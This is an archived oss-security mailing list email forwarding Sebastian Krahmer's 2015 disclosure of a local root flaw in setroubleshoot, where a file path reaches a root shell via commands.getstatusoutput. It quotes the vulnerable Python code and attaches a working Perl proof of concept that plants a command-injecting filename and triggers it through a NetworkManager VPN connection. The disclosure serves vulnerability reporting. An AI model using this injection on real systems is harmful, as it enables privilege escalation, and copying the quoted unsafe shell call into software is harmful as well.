X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4297" "Thursday" "26" "March" "2015" "08:01:41" "+0100" "Sebastian Krahmer" "krahmer@suse.de" "<20150326070141.GA25037@suse.de>" "139" "[oss-security] Fwd: setroubleshoot root exploit (CVE-Request)" nil nil nil "3" "2015032607:01:41" "[oss-security] Fwd: setroubleshoot root exploit (CVE-Request)" (number mark "        krahmer@suse Mar 26  139/4297  " thread-indent "\"[oss-security] Fwd: setroubleshoot root exploit (CVE-Request)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 12171 invoked by uid 550); 26 Mar 2015 07:02:12 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 12029 invoked from network); 26 Mar 2015 07:01:53 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Message-ID: <20150326070141.GA25037@suse.de>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Organization: SUSE Linux GmbH, GF: Felix =?utf-8?Q?Imend?=
 =?utf-8?Q?=F6rffer=2C_Jane_Smithard=2C_Jennife?= =?utf-8?Q?r?= Guild, Dilip
 Upmanyu, Graham Norton, HRB 21284 (AG Nuernberg)
User-Agent: Mutt/1.5.21 (2010-09-15)
Date: Thu, 26 Mar 2015 08:01:41 +0100
From: Sebastian Krahmer <krahmer@suse.de>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Fwd: setroubleshoot root exploit (CVE-Request)
To: oss-security@lists.openwall.com


As per list policy, here is the forward of the distros post. CRD was shifted
to today.


----- Forwarded message from Sebastian Krahmer <krahmer@suse.de> -----

Date: Wed, 18 Mar 2015 09:46:10 +0100
From: Sebastian Krahmer <krahmer@suse.de>
To: distros@vs.openwall.org
subject: ***UNCHECKED*** [vs] setroubleshoot root exploit (CVE-Request)
X-Mailer: MIME-tools 5.501 (Entity 5.501)

Hi

I already sent this to upstream. Initially I thought this only
affects redhat, but it seems that ubuntu is also using setroubleshoot.
CRD is 24.3.

setroubleshoot tries to find out which rpm a particular
file belongs to when it finds SELinux access violation reports.
The idea is probably to have convenient reports for the admin
which type enforcement rules have to be relaxed. setroubleshoot
runs as root (although in its own domain). In util.py
we have:


266 def get_rpm_nvr_by_file_path_temporary(name):
267     if name is None or not os.path.exists(name):
268         return None
269 
270     nvr = None
271     try:
272         import commands
273         rc, output = commands.getstatusoutput("rpm -qf '%s'" % name)
274         if rc == 0:
275             nvr = output
276     except:
277         syslog.syslog(syslog.LOG_ERR, "failed to retrieve rpm info for %s" %     name)
278     return nvr

(and other similar occurences)

So. Yes, thats correct: The SELinux system that is only there to protect you,
passes attacker controlled data to sh -c (https://docs.python.org/2/library/commands.html)
inside a daemon running as root. Sacken lassen...

I attached a PoC which uses networkmanager's openvpn plugin to execute
arbitraty commands by triggering an access violation to a pathname
which contains shell commands.

The setroubleshootd_t domain has quite a lot of allowed rules and transitions,
so this can clearly count as privilege escalation. Furthermore a lot
of admins run their system in permissive mode (full root) even when
its shipped enforcing by default.

Also note that there are potentially remote vectors, if attackers
can control part of the filenames being created (web uploads, git, scp, ftp etc).

Sebastian


PS: I am all for SELinux but theres something on the wrong way. I counted
the LOC, and the core SELinux (kernel) has a smaller codebase than whats
framed around in python, running as root and mangling attacker controlled input.
IOW, the system that wants to protect you has fewer code enforcing the rules
than code that potentially blows up your system. And that code is python,
so let alone all the python modules and interpreter hat can have bugs on its own.
Driving such a lane _can only lead to abyss_. And I am not saying that evil
powers are creating an overly complex system to better hide their bugdoors
within.

PPS: bug-logo will follow :)

-- 

~ perl self.pl
~ $_='print"\$_=\47$_\47;eval"';eval
~ krahmer@suse.de - SuSE Security Team


#!/usr/bin/perl

#
# Fedora21 setroubleshootd local root PoC
#
# (C) 2015 Sebastian Krahmer
#
# - requires polkit authorization to add/mod VPN connections
#   to NetworkManager (default on desktop user)
# - after execution of this script, which adds appropriate
#   NM connection entries, try
#
#  $ nmcli c up vpn-FOOBAR
#
# a couple of times, until you see:
#
# logger[4062]: uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:setroubleshootd_t:...
#
# in the journalctl logs
#
# PS: I know in advance what the SELinux developers will say... :p
#
# I say: lulz!



# create a pathname that setroubleshootd will eventually
# query sh -c { rpm -qf ... with, fucking up ' escaping. So the
# embedded pathname is then evaluated as command
#
# There goes your NSA-grade SELinux security!!!

$file = "/tmp/foo.pem';`id|logger`;echo '";
open(O, ">", $file) or die $!;
close O;

# add connection
system("nmcli c add type vpn ifname FOOBAR vpn-type openvpn");
open(O,"|nmcli c edit vpn-FOOBAR") or die $!;

print O "set vpn.data ca = /tmp/foo.pem';`id|logger`;echo ', password-flags = 1, connection-type = password, remote = 1.2.3.4, username = FOOBAR\n";
print O "set vpn.secrets password=1\nsave\nquit\n";
close(O);


print "Now do 'nmcli c up vpn-FOOBAR' and watch logs.\n";




----- End forwarded message -----

-- 

~ perl self.pl
~ $_='print"\$_=\47$_\47;eval"';eval
~ krahmer@suse.de - SuSE Security Team

